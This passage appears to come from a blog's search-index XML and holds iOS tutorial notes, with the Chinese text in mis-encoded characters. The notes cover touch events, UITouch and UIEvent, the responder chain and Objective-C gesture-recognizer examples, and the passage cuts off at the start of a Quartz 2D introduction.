¹æ‰‹æŒ‡åœ¨viewä¸Šç§»åŠ¨ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è°ƒç”¨viewçš„ä¸‹é¢æ–¹æ³•ï¼ˆéšç€æ‰‹æŒ‡çš„ç§»åŠ¨ï¼Œä¼šæŒç»­è°ƒç”¨è¯¥æ–¹æ³•ï¼‰- (void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event// ä¸€æ ¹æˆ–è€…å¤šæ ¹æ‰‹æŒ‡ç¦»å¼€viewï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è°ƒç”¨viewçš„ä¸‹é¢æ–¹æ³•- (void)touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event// è§¦æ‘¸ç»“æŸå‰ï¼ŒæŸä¸ªç³»ç»Ÿäº‹ä»¶(ä¾‹å¦‚ç”µè¯å‘¼å…¥)ä¼šæ‰“æ–­è§¦æ‘¸è¿‡ç¨‹ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è°ƒç”¨viewçš„ä¸‹é¢æ–¹æ³•- (void)touchesCancelled:(NSSet *)touches withEvent:(UIEvent *)event// æç¤ºï¼štouchesä¸­å­˜æ”¾çš„éƒ½æ˜¯UITouchå¯¹è±¡ UITouch å½“ç”¨æˆ·ç”¨ä¸€æ ¹è§¦æ‘¸å±å¹•æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªä¸Žæ‰‹æŒ‡ç›¸å…³è”çš„UITouchå¯¹è±¡ï¼š ä¸€æ ¹æ‰‹æŒ‡å¯¹åº”ä¸€ä¸ªUITouchå¯¹è±¡ UITouchçš„ä½œç”¨ï¼š ä¿å­˜ç€è·Ÿæ‰‹æŒ‡ç›¸å…³çš„ä¿¡æ¯ï¼Œæ¯”å¦‚è§¦æ‘¸çš„ä½ç½®ã€æ—¶é—´ã€é˜¶æ®µ å½“æ‰‹æŒ‡ç§»åŠ¨æ—¶ï¼Œç³»ç»Ÿä¼šæ›´æ–°åŒä¸€ä¸ªUITouchå¯¹è±¡ï¼Œä½¿ä¹‹èƒ½å¤Ÿä¸€ç›´ä¿å­˜è¯¥æ‰‹æŒ‡åœ¨çš„è§¦æ‘¸ä½ç½® å½“æ‰‹æŒ‡ç¦»å¼€å±å¹•æ—¶ï¼Œç³»ç»Ÿä¼šé”€æ¯ç›¸åº”çš„UITouchå¯¹è±¡ æç¤ºï¼šiPhoneå¼€å‘ä¸­ï¼Œè¦é¿å…ä½¿ç”¨åŒå‡»äº‹ä»¶ï¼ UITouchçš„å±žæ€§1234567891011121314// è§¦æ‘¸äº§ç”Ÿæ—¶æ‰€å¤„çš„çª—å£@property(nonatomic,readonly,retain) UIWindow *window;// è§¦æ‘¸äº§ç”Ÿæ—¶æ‰€å¤„çš„è§†å›¾@property(nonatomic,readonly,retain) UIView *view;// çŸ­æ—¶é—´å†…ç‚¹æŒ‰å±å¹•çš„æ¬¡æ•°ï¼Œå¯ä»¥æ ¹æ®tapCountåˆ¤æ–­å•å‡»ã€åŒå‡»æˆ–æ›´å¤šçš„ç‚¹å‡»@property(nonatomic,readonly) NSUInteger tapCount;// è®°å½•äº†è§¦æ‘¸äº‹ä»¶äº§ç”Ÿæˆ–å˜åŒ–æ—¶çš„æ—¶é—´ï¼Œå•ä½æ˜¯ç§’@property(nonatomic,readonly) NSTimeInterval timestamp;// å½“å‰è§¦æ‘¸äº‹ä»¶æ‰€å¤„çš„çŠ¶æ€@property(nonatomic,readonly) UITouchPhase phase; UITouchçš„æ–¹æ³•1234567- (CGPoint)locationInView:(UIView *)view;// è¿”å›žå€¼è¡¨ç¤ºè§¦æ‘¸åœ¨viewä¸Šçš„ä½ç½®// è¿™é‡Œè¿”å›žçš„ä½ç½®æ˜¯é’ˆå¯¹viewçš„åæ ‡ç³»çš„ï¼ˆä»¥viewçš„å·¦ä¸Šè§’ä¸ºåŽŸç‚¹(0, 0)ï¼‰// è°ƒç”¨æ—¶ä¼ å…¥çš„viewå‚æ•°ä¸ºnilçš„è¯ï¼Œè¿”å›žçš„æ˜¯è§¦æ‘¸ç‚¹åœ¨UIWindowçš„ä½ç½®- (CGPoint)previousLocationInView:(UIView *)view;// è¯¥æ–¹æ³•è®°å½•äº†å‰ä¸€ä¸ªè§¦æ‘¸ç‚¹çš„ä½ç½® UIEvent æ¯äº§ç”Ÿä¸€ä¸ªäº‹ä»¶ï¼Œå°±ä¼šäº§ç”Ÿä¸€ä¸ªUIEventå¯¹è±¡ UIEventï¼šç§°ä¸ºäº‹ä»¶å¯¹è±¡ï¼Œè®°å½•äº‹ä»¶äº§ç”Ÿçš„æ—¶åˆ»å’Œç±»åž‹ 123456789// å¸¸è§å±žæ€§// äº‹ä»¶ç±»åž‹@property(nonatomic,readonly) UIEventType type;@property(nonatomic,readonly) UIEventSubtype subtype;// äº‹ä»¶äº§ç”Ÿçš„æ—¶é—´@property(nonatomic,readonly) NSTimeInterval timestamp;// UIEventè¿˜æä¾›äº†ç›¸åº”çš„æ–¹æ³•å¯ä»¥èŽ·å¾—åœ¨æŸä¸ªviewä¸Šé¢çš„è§¦æ‘¸å¯¹è±¡ï¼ˆUITouchï¼‰ toucheså’Œeventå‚æ•° ä¸€æ¬¡å®Œæ•´çš„è§¦æ‘¸è¿‡ç¨‹ï¼Œä¼šç»åŽ†3ä¸ªçŠ¶æ€ï¼š 1234è§¦æ‘¸å¼€å§‹ï¼š- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)eventè§¦æ‘¸ç§»åŠ¨ï¼š- (void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)eventè§¦æ‘¸ç»“æŸï¼š- (void)touchesEnded:(NSSet *)touches withEvent:(UIEvent *)eventè§¦æ‘¸å–æ¶ˆï¼ˆå¯èƒ½ä¼šç»åŽ†ï¼‰ï¼š- (void)touchesCancelled:(NSSet *)touches withEvent:(UIEvent *)event 4ä¸ªè§¦æ‘¸äº‹ä»¶å¤„ç†æ–¹æ³•ä¸­ï¼Œéƒ½æœ‰NSSet *toucheså’ŒUIEvent *eventä¸¤ä¸ªå‚æ•°ä¸€æ¬¡å®Œæ•´çš„è§¦æ‘¸è¿‡ç¨‹ä¸­ï¼Œåªä¼šäº§ç”Ÿä¸€ä¸ªäº‹ä»¶å¯¹è±¡ï¼Œ4ä¸ªè§¦æ‘¸æ–¹æ³•éƒ½æ˜¯åŒä¸€ä¸ªeventå‚æ•° å¦‚æžœä¸¤æ ¹æ‰‹æŒ‡åŒæ—¶è§¦æ‘¸ä¸€ä¸ªviewï¼Œé‚£ä¹ˆviewåªä¼šè°ƒç”¨ä¸€æ¬¡touchesBegan:withEvent:æ–¹æ³•ï¼Œtoucheså‚æ•°ä¸­è£…ç€2ä¸ªUITouchå¯¹è±¡ å¦‚æžœè¿™ä¸¤æ ¹æ‰‹æŒ‡ä¸€å‰ä¸€åŽåˆ†å¼€è§¦æ‘¸åŒä¸€ä¸ªviewï¼Œé‚£ä¹ˆviewä¼šåˆ†åˆ«è°ƒç”¨2æ¬¡touchesBegan:withEvent:æ–¹æ³•ï¼Œå¹¶ä¸”æ¯æ¬¡è°ƒç”¨æ—¶çš„toucheså‚æ•°ä¸­åªåŒ…å«ä¸€ä¸ªUITouchå¯¹è±¡ æ ¹æ®touchesä¸­UITouchçš„ä¸ªæ•°å¯ä»¥åˆ¤æ–­å‡ºæ˜¯å•ç‚¹è§¦æ‘¸è¿˜æ˜¯å¤šç‚¹è§¦æ‘¸ è§¦æ‘¸äº‹ä»¶çš„äº§ç”Ÿå’Œä¼ é€’ å‘ç”Ÿè§¦æ‘¸äº‹ä»¶åŽï¼Œç³»ç»Ÿä¼šå°†è¯¥äº‹ä»¶åŠ å…¥åˆ°ä¸€ä¸ªç”±UIApplicationç®¡ç†çš„äº‹ä»¶é˜Ÿåˆ—ä¸­ UIApplicationä¼šä»Žäº‹ä»¶é˜Ÿåˆ—ä¸­å–å‡ºæœ€å‰é¢çš„äº‹ä»¶ï¼Œå¹¶å°†äº‹ä»¶åˆ†å‘ä¸‹åŽ»ä»¥ä¾¿å¤„ç†ï¼Œé€šå¸¸ï¼Œå…ˆå‘é€äº‹ä»¶ç»™åº”ç”¨ç¨‹åºçš„ä¸»çª—å£ï¼ˆkeyWindowï¼‰ ä¸»çª—å£ä¼šåœ¨è§†å›¾å±‚æ¬¡ç»“æž„ä¸­æ‰¾åˆ°ä¸€ä¸ªæœ€åˆé€‚çš„è§†å›¾æ¥å¤„ç†è§¦æ‘¸äº‹ä»¶ï¼Œè¿™ä¹Ÿæ˜¯æ•´ä¸ªäº‹ä»¶å¤„ç†è¿‡ç¨‹çš„ç¬¬ä¸€æ­¥ æ‰¾åˆ°åˆé€‚çš„è§†å›¾æŽ§ä»¶åŽï¼Œå°±ä¼šè°ƒç”¨è§†å›¾æŽ§ä»¶çš„touchesæ–¹æ³•æ¥ä½œå…·ä½“çš„äº‹ä»¶å¤„ç† äº‹ä»¶çš„äº§ç”Ÿå’Œä¼ é€’ è§¦æ‘¸äº‹ä»¶çš„ä¼ é€’æ˜¯ä»Žçˆ¶æŽ§ä»¶ä¼ é€’åˆ°å­æŽ§ä»¶ 123456ç‚¹å‡»äº†ç»¿è‰²çš„viewï¼šUIApplication -&gt; UIWindow -&gt; ç™½è‰² -&gt; ç»¿è‰²ç‚¹å‡»äº†è“è‰²çš„viewï¼šUIApplication -&gt; UIWindow -&gt; ç™½è‰² -&gt; æ©™è‰² -&gt; è“è‰²ç‚¹å‡»äº†é»„è‰²çš„viewï¼šUIApplication -&gt; UIWindow -&gt; ç™½è‰² -&gt; æ©™è‰² -&gt; è“è‰² -&gt; é»„è‰² æ³¨æ„ å¦‚æžœçˆ¶æŽ§ä»¶ä¸èƒ½æŽ¥æ”¶è§¦æ‘¸äº‹ä»¶ï¼Œé‚£ä¹ˆå­æŽ§ä»¶å°±ä¸å¯èƒ½æŽ¥æ”¶åˆ°è§¦æ‘¸äº‹ä»¶ å¦‚ä½•æ‰¾åˆ°æœ€åˆé€‚çš„æŽ§ä»¶æ¥å¤„ç†äº‹ä»¶ï¼Ÿ(æ­¥éª¤å¦‚ä¸‹) è‡ªå·±æ˜¯å¦èƒ½æŽ¥æ”¶è§¦æ‘¸äº‹ä»¶ï¼Ÿ è§¦æ‘¸ç‚¹æ˜¯å¦åœ¨è‡ªå·±èº«ä¸Šï¼Ÿ ä»ŽåŽå¾€å‰éåŽ†å­æŽ§ä»¶ï¼Œé‡å¤å‰é¢çš„ä¸¤ä¸ªæ­¥éª¤ å¦‚æžœæ²¡æœ‰ç¬¦åˆæ¡ä»¶çš„å­æŽ§ä»¶ï¼Œé‚£ä¹ˆå°±è‡ªå·±æœ€é€‚åˆå¤„ç† æ³¨æ„: ä»ŽåŽå¾€å‰éåŽ†å­æŽ§ä»¶â€“â€åŽâ€æ˜¯è¡¨ç¤ºæ•°ç»„é‡Œæœ€å¤–é¢çš„,å³æ˜¯æ˜¾ç¤ºåœ¨æœ€å‰é¢çš„æŽ§ä»¶.(æ¯”å¦‚subviews[0]å³æ˜¯æœ€å‰é¢çš„â€“æ˜¯UIWindow) UIViewä¸æŽ¥æ”¶è§¦æ‘¸äº‹ä»¶çš„ä¸‰ç§æƒ…å†µ æç¤ºï¼šUIImageViewçš„userInteractionEnabledé»˜è®¤å°±æ˜¯NOï¼Œå› æ­¤UIImageViewä»¥åŠå®ƒçš„å­æŽ§ä»¶é»˜è®¤æ˜¯ä¸èƒ½æŽ¥æ”¶è§¦æ‘¸äº‹ä»¶çš„ 12345678// ä¸æŽ¥æ”¶ç”¨æˆ·äº¤äº’userInteractionEnabled = NO// éšè—hidden = YES// é€æ˜Žalpha = 0.0 ~ 0.01 å“åº”è€…é“¾æ¡ äº‹ä»¶çš„å¤„ç†è¿‡ç¨‹(è¯¦ç»†) ç”¨æˆ·ç‚¹å‡»å±å¹•åŽäº§ç”Ÿçš„ä¸€ä¸ªè§¦æ‘¸äº‹ä»¶ï¼Œç»è¿‡ä¸€äº›åˆ—çš„ä¼ é€’è¿‡ç¨‹åŽï¼Œä¼šæ‰¾åˆ°æœ€åˆé€‚çš„è§†å›¾æŽ§ä»¶æ¥å¤„ç†è¿™ä¸ªäº‹ä»¶ æ‰¾åˆ°æœ€åˆé€‚çš„è§†å›¾æŽ§ä»¶åŽï¼Œå°±ä¼šè°ƒç”¨æŽ§ä»¶çš„touchesæ–¹æ³•æ¥ä½œå…·ä½“çš„äº‹ä»¶å¤„ç† è¿™äº›touchesæ–¹æ³•çš„é»˜è®¤åšæ³•æ˜¯å°†äº‹ä»¶é¡ºç€å“åº”è€…é“¾æ¡å‘ä¸Šä¼ é€’ï¼Œå°†äº‹ä»¶äº¤ç»™ä¸Šä¸€ä¸ªå“åº”è€…è¿›è¡Œå¤„ç† å“åº”è€…é“¾æ¡ç¤ºæ„å›¾&gt; å“åº”è€…é“¾çš„äº‹ä»¶ä¼ é€’è¿‡ç¨‹ å¦‚æžœviewçš„æŽ§åˆ¶å™¨å­˜åœ¨ï¼Œå°±ä¼ é€’ç»™æŽ§åˆ¶å™¨ï¼›å¦‚æžœæŽ§åˆ¶å™¨ä¸å­˜åœ¨ï¼Œåˆ™å°†å…¶ä¼ é€’ç»™å®ƒçš„çˆ¶è§†å›¾ åœ¨è§†å›¾å±‚æ¬¡ç»“æž„çš„æœ€é¡¶çº§è§†å›¾ï¼Œå¦‚æžœä¹Ÿä¸èƒ½å¤„ç†æ”¶åˆ°çš„äº‹ä»¶æˆ–æ¶ˆæ¯ï¼Œåˆ™å…¶å°†äº‹ä»¶æˆ–æ¶ˆæ¯ä¼ é€’ç»™windowå¯¹è±¡è¿›è¡Œå¤„ç† å¦‚æžœwindowå¯¹è±¡ä¹Ÿä¸å¤„ç†ï¼Œåˆ™å…¶å°†äº‹ä»¶æˆ–æ¶ˆæ¯ä¼ é€’ç»™UIApplicationå¯¹è±¡ å¦‚æžœUIApplicationä¹Ÿä¸èƒ½å¤„ç†è¯¥äº‹ä»¶æˆ–æ¶ˆæ¯ï¼Œåˆ™å°†å…¶ä¸¢å¼ƒ æ‰‹åŠ¿è¯†åˆ« æ·»åŠ æ‰‹åŠ¿çš„æ–¹å¼ ä»£ç åˆ›å»º,æ·»åŠ ç›‘å¬(æ–¹æ³•) storyboardçš„é‡Œé¢æ‹–æ‰‹åŠ¿,æ·»åŠ ç›‘å¬(æ‹–çº¿(æ‰‹åŠ¿æ–¹æ³•)) ç›‘å¬è§¦æ‘¸äº‹ä»¶ å¦‚æžœæƒ³ç›‘å¬ä¸€ä¸ªviewä¸Šé¢çš„è§¦æ‘¸äº‹ä»¶ï¼Œä¹‹å‰çš„åšæ³•æ˜¯è‡ªå®šä¹‰ä¸€ä¸ªview å®žçŽ°viewçš„touchesæ–¹æ³•ï¼Œåœ¨æ–¹æ³•å†…éƒ¨å®žçŽ°å…·ä½“å¤„ç†ä»£ç  ç¼ºç‚¹ é€šè¿‡touchesæ–¹æ³•ç›‘å¬viewè§¦æ‘¸äº‹ä»¶ï¼Œæœ‰å¾ˆæ˜Žæ˜¾çš„å‡ ä¸ªç¼ºç‚¹ å¿…é¡»å¾—è‡ªå®šä¹‰view ç”±äºŽæ˜¯åœ¨viewå†…éƒ¨çš„touchesæ–¹æ³•ä¸­ç›‘å¬è§¦æ‘¸äº‹ä»¶ï¼Œå› æ­¤é»˜è®¤æƒ…å†µä¸‹ï¼Œæ— æ³•è®©å…¶ä»–å¤–ç•Œå¯¹è±¡ç›‘å¬viewçš„è§¦æ‘¸äº‹ä»¶ï¼Œä¸å®¹æ˜“åŒºåˆ†ç”¨æˆ·çš„å…·ä½“æ‰‹åŠ¿è¡Œä¸º iOS 3.2ä¹‹åŽï¼Œè‹¹æžœæŽ¨å‡ºäº†æ‰‹åŠ¿è¯†åˆ«åŠŸèƒ½ï¼ˆGesture Recognizerï¼‰ï¼Œåœ¨è§¦æ‘¸äº‹ä»¶å¤„ç†æ–¹é¢ï¼Œå¤§å¤§ç®€åŒ–äº†å¼€å‘è€…çš„å¼€å‘éš¾åº¦ UIGestureRecognizer ä¸ºäº†å®Œæˆæ‰‹åŠ¿è¯†åˆ«ï¼Œå¿…é¡»å€ŸåŠ©äºŽæ‰‹åŠ¿è¯†åˆ«å™¨â€“UIGestureRecognizer åˆ©ç”¨UIGestureRecognizerï¼Œèƒ½è½»æ¾è¯†åˆ«ç”¨æˆ·åœ¨æŸä¸ªviewä¸Šé¢åšçš„ä¸€äº›å¸¸è§æ‰‹åŠ¿ UIGestureRecognizeræ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå®šä¹‰äº†æ‰€æœ‰æ‰‹åŠ¿çš„åŸºæœ¬è¡Œä¸ºï¼Œä½¿ç”¨å®ƒçš„å­ç±»æ‰èƒ½å¤„ç†å…·ä½“çš„æ‰‹åŠ¿ 123456UITapGestureRecognizer(æ•²å‡»)UIPinchGestureRecognizer(æåˆï¼Œç”¨äºŽç¼©æ”¾)UIPanGestureRecognizer(æ‹–æ‹½)UISwipeGestureRecognizer(è½»æ‰«)UIRotationGestureRecognizer(æ—‹è½¬)UILongPressGestureRecognizer(é•¿æŒ‰) UITapGestureRecognizer æ¯ä¸€ä¸ªæ‰‹åŠ¿è¯†åˆ«å™¨çš„ç”¨æ³•éƒ½å·®ä¸å¤šï¼Œæ¯”å¦‚UITapGestureRecognizerçš„ä½¿ç”¨æ­¥éª¤å¦‚ä¸‹ 12345678910111213141516171819202122232425262728/** æ‰‹æŒ‡æ•²å‡»æ‰‹åŠ¿ */- (void)tap&#123; // åˆ›å»ºæ‰‹åŠ¿è¯†åˆ«å™¨ç‚¹å‡»å¯¹è±¡ UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(didTap)]; // ç‚¹å‡»æ¬¡æ•° tap.numberOfTapsRequired = 2; // ç‚¹å‡»æ‰‹æŒ‡æ•°(éœ€è¦å‡ æ ¹æ‰‹æŒ‡æ“ä½œ) tap.numberOfTouchesRequired = 1; // è®¾ç½®ä»£ç† tap.delegate = self; [self.iconView addGestureRecognizer:tap];&#125;/** * æ˜¯å¦æŽ¥æ”¶å¤„ç†ç‚¹å‡»äº‹ä»¶ */- (BOOL)gestureRecognizer:(UIGestureRecognizer *)gestureRecognizer shouldReceiveTouch:(UITouch *)touch&#123; CGPoint point = [touch locationInView:touch.view]; // å¯ä»¥åœ¨è¿™é‡Œé¢ç¡®å®šç‚¹å‡»çš„èŒƒå›´(åœ¨å“ªä¸ªèŒƒå›´ä½œå‡ºå›žåº”) if (point.x &lt;= self.iconView.frame.size.width * 0.5) &#123; // æŽ§åˆ¶å›¾ç‰‡åªæœ‰ä¸€åŠç‚¹å‡»æœ‰ååº” return NO; &#125;else&#123; return YES; &#125;&#125; UILongPressGestureRecognizer1234567891011- (void)demo&#123; // åˆ›å»ºé•¿æŒ‰æ‰‹åŠ¿è¯†åˆ«å™¨ UILongPressGestureRecognizer *longPress = [[UILongPressGestureRecognizer alloc] initWithTarget:self action:@selector(didLongPress)]; // è®¾ç½®é•¿æŒ‰å¤šä¹…ç”Ÿæ•ˆ longPress.minimumPressDuration = 2; // è®¾ç½®é•¿æŒ‰çš„æ—¶å€™çš„ç”Ÿæ•ˆçš„ä¸€ä¸ªèŒƒå›´(åœ¨è¿™ä¸ªèŒƒå›´å†…æ‰èƒ½æ‰§è¡Œ) longPress.allowableMovement = 10; // æ·»åŠ åˆ°å›¾ç‰‡ [self.iconView addGestureRecognizer:longPress];&#125; UISwipeGestureRecognizer12345678// é»˜è®¤å›¾ç‰‡æ˜¯ä¸èƒ½äº¤äº’çš„self.iconView.userInteractionEnabled = YES;// åˆ›å»ºè½»æ‰«æ‰‹åŠ¿è¯†åˆ«å™¨UISwipeGestureRecognizer *swip = [[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(didSwipe)];// è½»æ‰«çš„æ–¹å‘(é»˜è®¤æ˜¯ä»Žå³è¾¹è½»æ‰«)swip.direction = UISwipeGestureRecognizerDirectionLeft;// æ·»åŠ åˆ°å›¾ç‰‡[self.iconView addGestureRecognizer:swip]; UIRotationGestureRecognizer123456789101112131415- (void)rotationGesture&#123; // åˆ›å»ºæ—‹è½¬æ‰‹åŠ¿è¯†åˆ«å™¨ UIRotationGestureRecognizer *rotate = [[UIRotationGestureRecognizer alloc] initWithTarget:self action:@selector(didRotation:)]; rotate.delegate = self; [self.iconView addGestureRecognizer:rotate];&#125;- (void)didRotation:(UIRotationGestureRecognizer *)rotate&#123; // æ—‹è½¬çš„è§’åº¦å’Œæ‰‹åŠ¿æ—‹è½¬çš„è§’åº¦ä¸€æ · self.iconView.transform = CGAffineTransformRotate(self.iconView.transform, rotate.rotation);#warning è¿™ä¸ªå¾ˆé‡è¦!!! rotate.rotation = 0; // ä¸æŠŠæ—‹è½¬è§’åº¦æ¸…é›¶çš„è¯ ç›´æŽ¥ç´¯åŠ ä¸ŠåŽ» æ—‹è½¬å¹…åº¦éžå¸¸å¤§&#125; UIPinchGestureRecognizer12345678910111213141516171819- (void)pinchGesture&#123; // åˆ›å»ºæåˆæ‰‹åŠ¿è¯†åˆ«å™¨ UIPinchGestureRecognizer *pinch = [[UIPinchGestureRecognizer alloc] initWithTarget:self action:@selector(didPinch:)]; pinch.delegate = self; // æ·»åŠ  [self.iconView addGestureRecognizer:pinch];&#125;/** * æ‰‹æŒ‡æåˆåŽè°ƒç”¨çš„æ–¹æ³• */- (void)didPinch:(UIPinchGestureRecognizer *)pinch&#123; // ç¼©æ”¾çš„å€æ•°å’Œæ‰‹æŒ‡æåˆçš„å€æ•°ç›¸åŒ self.iconView.transform = CGAffineTransformScale(self.iconView.transform, pinch.scale, pinch.scale);#warning è¿™ä¸ªå¾ˆé‡è¦!!! // ç¼©æ”¾å€æ•°é‡ç½®ä¸º1 pinch.scale = 1; // è¿™ä¸€æ­¥å¾ˆé‡è¦ å¿…é¡»è¦å†™,ä¸ç„¶å›¾ç‰‡ç¼©æ”¾çš„å€æ•°ä¼šç´¯åŠ  å¹…åº¦å¾ˆå¤§!!!&#125; UIPanGestureRecognizer12345678910111213141516// åˆ›å»ºæ‹–æ‹½æ‰‹åŠ¿ UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(didPan:)]; [self.iconView addGestureRecognizer:pan];- (void)didPan:(UIPanGestureRecognizer *)pan&#123; // æ‹–æ‹½çš„ä½ç½® CGPoint panPoint = [pan translationInView:pan.view]; // å›¾ç‰‡çš„ä¸­å¿ƒç‚¹ CGPoint center = self.iconView.center; // å›¾ç‰‡ç§»åŠ¨çš„è·ç¦»å°±ç­‰äºŽæ‹–æ‹½çš„è·ç¦» center.x += panPoint.x; center.y += panPoint.y; // é‡æ–°èµ‹å€¼ç»™å›¾ç‰‡çš„ä¸­å¿ƒç‚¹ self.iconView.center = center; // æ¸…ç©ºç§»åŠ¨çš„è·ç¦» é˜²æ­¢ç´¯åŠ åŽç§»åŠ¨å¹…åº¦è¿‡å¤§(ä¸€å®šè¦æ¸…ç©º) [pan setTranslation:CGPointZero inView:pan.view];&#125; æ‰‹åŠ¿è¯†åˆ«çš„çŠ¶æ€12345678910111213141516typedef NS_ENUM(NSInteger, UIGestureRecognizerState) &#123; // æ²¡æœ‰è§¦æ‘¸äº‹ä»¶å‘ç”Ÿï¼Œæ‰€æœ‰æ‰‹åŠ¿è¯†åˆ«çš„é»˜è®¤çŠ¶æ€ UIGestureRecognizerStatePossible, // ä¸€ä¸ªæ‰‹åŠ¿å·²ç»å¼€å§‹ä½†å°šæœªæ”¹å˜æˆ–è€…å®Œæˆæ—¶ UIGestureRecognizerStateBegan, // æ‰‹åŠ¿çŠ¶æ€æ”¹å˜ UIGestureRecognizerStateChanged, // æ‰‹åŠ¿å®Œæˆ UIGestureRecognizerStateEnded, // æ‰‹åŠ¿å–æ¶ˆï¼Œæ¢å¤è‡³PossibleçŠ¶æ€ UIGestureRecognizerStateCancelled, // æ‰‹åŠ¿å¤±è´¥ï¼Œæ¢å¤è‡³PossibleçŠ¶æ€ UIGestureRecognizerStateFailed, // è¯†åˆ«åˆ°æ‰‹åŠ¿è¯†åˆ« UIGestureRecognizerStateRecognized = UIGestureRecognizerStateEnded&#125;; æ‰‹åŠ¿çš„æ³¨æ„ç‚¹ æ‰‹åŠ¿é»˜è®¤ä¸èƒ½ä¸€æ¬¡æ·»åŠ å¤šä¸ªæ‰‹åŠ¿,ä¸€æ¬¡æ·»åŠ å¤šä¸ªæ‰‹åŠ¿åªèƒ½è¯†åˆ«ä¸€ä¸ª(æœ€åŽæ·»åŠ é‚£ä¸ªæ‰‹åŠ¿),ä½†æ˜¯å¯ä»¥åˆ›å»ºå¤šä¸ªæ‰‹åŠ¿,è¿™æ ·æ‰èƒ½è¯†åˆ«å¤šä¸ªæ‰‹åŠ¿. Simultaneously (åŒæ—¶åœ°,åŒæ­¥åœ°) 1234567/** * é»˜è®¤ä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ªæ‰‹åŠ¿,è®¾ç½®è¿™ä¸ªå¯ä»¥ä¸€æ¬¡æ‰§è¡Œå¤šä¸ªæ‰‹åŠ¿æ“ä½œ */- (BOOL)gestureRecognizer:(UIGestureRecognizer *)gestureRecognizer shouldRecognizeSimultaneouslyWithGestureRecognizer:(UIGestureRecognizer *)otherGestureRecognizer&#123; return YES;&#125;]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Event</tag>
        <tag>Recognizer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¹‹Quartz2Då…¥é—¨]]></title>
    <url>%2Farchives%2F434e49e7.html</url>
    <content type="text"><![CDATA[å®£å®¤æ±‚è´¤è®¿é€è‡£ï¼Œè´¾ç”Ÿæ‰è°ƒæ›´æ— ä¼¦ã€‚å¯æ€œå¤œåŠè™šå‰å¸­ï¼Œä¸é—®è‹ç”Ÿé—®é¬¼ç¥žã€‚ æŽå•†éš ã€Šè´¾ç”Ÿã€‹ åŸºæœ¬ä»‹ç» Quartz 2Dæ˜¯ä¸€ä¸ªäºŒç»´ç»˜å›¾å¼•æ“Žï¼ŒåŒæ—¶æ”¯æŒiOSå’ŒMacç³»ç»Ÿ Quartz 2Dèƒ½å®Œæˆçš„å·¥ä½œ ç»˜åˆ¶å›¾å½¢ : çº¿æ¡\ä¸‰è§’å½¢\çŸ©å½¢\åœ†\å¼§ç­‰ ç»˜åˆ¶æ–‡å­— ç»˜åˆ¶\ç”Ÿæˆå›¾ç‰‡(å›¾åƒ) è¯»å–\ç”ŸæˆPDF æˆªå›¾\è£å‰ªå›¾ç‰‡ è‡ªå®šä¹‰UIæŽ§ä»¶ â€¦ â€¦ drawRect:æ–¹æ³•çš„ä½¿ç”¨ å¸¸è§å›¾å½¢çš„ç»˜åˆ¶ï¼šçº¿æ¡ã€å¤šè¾¹å½¢ã€åœ† ç»˜å›¾çŠ¶æ€çš„è®¾ç½®ï¼šæ–‡å­—é¢œè‰²ã€çº¿å®½ç­‰ å›¾å½¢ä¸Šä¸‹æ–‡çŠ¶æ€çš„ä¿å­˜ä¸Žæ¢å¤ï¼ˆå›¾å½¢ä¸Šä¸‹æ–‡æ ˆï¼‰ å›¾ç‰‡è£å‰ª æˆªå›¾ å›¾å½¢ä¸Šä¸‹æ–‡ å›¾å½¢ä¸Šä¸‹æ–‡ï¼ˆGraphicsContextï¼‰ï¼šæ˜¯ä¸€ä¸ªCGContextRefç±»åž‹çš„æ•°æ® å›¾å½¢ä¸Šä¸‹æ–‡çš„ä½œç”¨ï¼š ä¿å­˜ç»˜å›¾ä¿¡æ¯ã€ç»˜å›¾çŠ¶æ€ å†³å®šç»˜åˆ¶çš„è¾“å‡ºç›®æ ‡ï¼ˆç»˜åˆ¶åˆ°ä»€ä¹ˆåœ°æ–¹åŽ»ï¼Ÿï¼‰ï¼ˆè¾“å‡ºç›®æ ‡å¯ä»¥æ˜¯PDFæ–‡ä»¶ã€Bitmapæˆ–è€…æ˜¾ç¤ºå™¨çš„çª—å£ä¸Šï¼‰ ç›¸åŒçš„ä¸€å¥—ç»˜å›¾åºåˆ—ï¼ŒæŒ‡å®šä¸åŒçš„GraphicsContextï¼Œå°±å¯å°†ç›¸åŒçš„å›¾åƒç»˜åˆ¶åˆ°ä¸åŒçš„ç›®æ ‡ä¸Š Quartz2Dæä¾›äº†ä»¥ä¸‹å‡ ç§ç±»åž‹çš„Graphics Contextï¼š 12345Bitmap Graphics ContextPDF Graphics ContextWindow Graphics ContextLayer Graphics ContextPrinter Graphics Context å¦‚ä½•åˆ©ç”¨Quartz2Dè‡ªå®šä¹‰viewï¼Ÿï¼ˆè‡ªå®šä¹‰UIæŽ§ä»¶ï¼‰ å¦‚ä½•åˆ©ç”¨Quartz2Dç»˜åˆ¶ä¸œè¥¿åˆ°viewä¸Šï¼Ÿ é¦–å…ˆï¼Œå¾—æœ‰å›¾å½¢ä¸Šä¸‹æ–‡ï¼Œå› ä¸ºå®ƒèƒ½ä¿å­˜ç»˜å›¾ä¿¡æ¯ï¼Œå¹¶ä¸”å†³å®šç€ç»˜åˆ¶åˆ°ä»€ä¹ˆåœ°æ–¹åŽ» å…¶æ¬¡ï¼Œé‚£ä¸ªå›¾å½¢ä¸Šä¸‹æ–‡å¿…é¡»è·Ÿviewç›¸å…³è”ï¼Œæ‰èƒ½å°†å†…å®¹ç»˜åˆ¶åˆ°viewä¸Šé¢ ä¸ºä»€ä¹ˆè¦å®žçŽ°drawRect:æ–¹æ³•æ‰èƒ½ç»˜å›¾åˆ°viewä¸Šï¼Ÿ å› 